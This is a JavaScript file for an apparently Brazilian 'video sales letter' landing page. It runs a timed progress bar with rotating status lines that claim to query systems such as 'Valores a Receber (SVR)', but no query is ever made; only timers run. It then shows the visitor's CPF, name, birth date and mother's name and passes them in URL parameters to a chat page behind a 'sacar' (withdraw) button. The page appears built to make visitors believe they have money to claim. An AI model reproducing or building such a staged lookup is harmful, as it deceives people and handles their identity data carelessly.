// vsl-script.js
(function() {
  "use strict";

  const progressBar      = document.getElementById('progressBar');
  const statusText       = document.getElementById('statusText');
  const consultingSection = document.getElementById('consultingSection');
  const resultSection    = document.getElementById('resultSection');

  const userCpf       = document.getElementById('userCpf');
  const userNome      = document.getElementById('userNome');
  const userNasc      = document.getElementById('userNasc');
  const userMae       = document.getElementById('userMae');
  const userFirstName = document.getElementById('userFirstName');
  const sacarBtn      = document.getElementById('sacarBtn');

  const statusList = [
    'Consultando Valores a Receber (SVR)',
    'Consultando Tarifas indevidas (TFI)',
    'Consultando Valores de Consorcios (VCS)',
    'Consultando Cooperativas de credito (SNCC)',
    'Consultando Fundos de credito (RNP)'
  ];

  // ---- UTM helpers ----
  function getUtmParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const keys = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'];
    const clickKeys = ['gclid', 'src', 'gbraid', 'wbraid'];
    const out = {};
    keys.forEach(k => { out[k] = urlParams.get(k) || 'direct'; });
    clickKeys.forEach(k => { const v = urlParams.get(k); if (v) out[k] = v; });
    const click = out.gclid || out.src || '';
    if (click && (!out.utm_content || out.utm_content === 'direct')) {
      out.utm_content = click;
      out.src = click;
    }
    return out;
  }

  function saveUtm(obj) {
    try { localStorage.setItem('utm_data', JSON.stringify(obj)); } catch (e) {}
  }

  function loadUtm() {
    try { const d = localStorage.getItem('utm_data'); return d ? JSON.parse(d) : null; } catch (e) { return null; }
  }

  function buildUtmQueryString() {
    const urlUtms = getUtmParams();
    const hasReal = Object.values(urlUtms).some(v => v !== 'direct');
    let stored = loadUtm();
    let final = urlUtms;
    if (!hasReal && stored) {
      final = stored;
    } else {
      saveUtm(urlUtms);
    }
    const p = new URLSearchParams();
    for (const [k, v] of Object.entries(final)) {
      if (v && v !== '') p.append(k, v);
    }
    return p.toString();
  }

  // ---- User data ----
  function getQueryParams() {
    const p = new URLSearchParams(window.location.search);
    const out = {};
    for (const [k, v] of p) out[k] = decodeURIComponent(v);
    return out;
  }

  function loadStoredUser() {
    try {
      const d = localStorage.getItem('api_response_data');
      if (d) { const p = JSON.parse(d); return p.data || null; }
    } catch (e) {}
    return null;
  }

  function getUserData() {
    const url = getQueryParams();
    if (url.nome) {
      return {
        nome: url.nome || '',
        cpf: url.cpf || '',
        data_nascimento: url.nasc || '',
        nome_mae: url.mae || '',
        sexo: url.sexo || ''
      };
    }
    const stored = loadStoredUser();
    if (stored) return stored;
    return { nome: 'Usuário', cpf: '---', data_nascimento: '---', nome_mae: '---', sexo: '' };
  }

  function updateUserInfo(u) {
    userCpf.textContent  = u.cpf || '---';
    userNome.textContent = u.nome || '---';
    userNasc.textContent = u.data_nascimento || '---';
    userMae.textContent  = u.nome_mae || '---';
    userFirstName.textContent = (u.nome || 'Usuário').split(' ')[0];
  }

  // ---- Status rotation ----
  let statusIndex = 0;
  let statusInterval;

  function startStatusRotation() {
    statusInterval = setInterval(() => {
      statusIndex = (statusIndex + 1) % statusList.length;
      const icon = '<i class="fa-solid fa-magnifying-glass"></i> ';
      statusText.innerHTML = icon + statusList[statusIndex];
    }, 20000);
  }

  function stopStatusRotation() {
    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
  }

  // ---- Progress bar ----
  function startProgressBar(duration) {
    let elapsed = 0;
    const interval = setInterval(() => {
      elapsed += 0.1;
      const pct = Math.min((elapsed / duration) * 100, 100);
      progressBar.style.width = pct + '%';
      if (elapsed >= duration) {
        clearInterval(interval);
        finishLoading();
      }
    }, 100);
  }

  // ---- Finish ----
  function finishLoading() {
    stopStatusRotation();
    consultingSection.style.display = 'none';
    resultSection.style.display = 'block';
  }

  // ---- Redirect ----
  function redirectToChat() {
    const utmQuery = buildUtmQueryString();
    const u = getUserData();
    const params = new URLSearchParams();
    if (utmQuery) { new URLSearchParams(utmQuery).forEach((v, k) => params.append(k, v)); }
    if (u.nome) params.append('nome', encodeURIComponent(u.nome));
    if (u.cpf)  params.append('cpf',  encodeURIComponent(u.cpf));
    if (u.data_nascimento) params.append('nasc', encodeURIComponent(u.data_nascimento));
    if (u.nome_mae) params.append('mae', encodeURIComponent(u.nome_mae));
    if (u.sexo) params.append('sexo', encodeURIComponent(u.sexo));
    const qs = params.toString();
    window.location.href = `../chat/index.html${qs ? '?' + qs : ''}`;
  }

  // ---- Init ----
  function init() {
    const u = getUserData();
    updateUserInfo(u);

    if (getQueryParams().nome) {
      try {
        localStorage.setItem('api_response_data', JSON.stringify({ success: true, data: u }));
      } catch (e) {}
    }

    startStatusRotation();
    startProgressBar(136);
    sacarBtn.addEventListener('click', redirectToChat);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();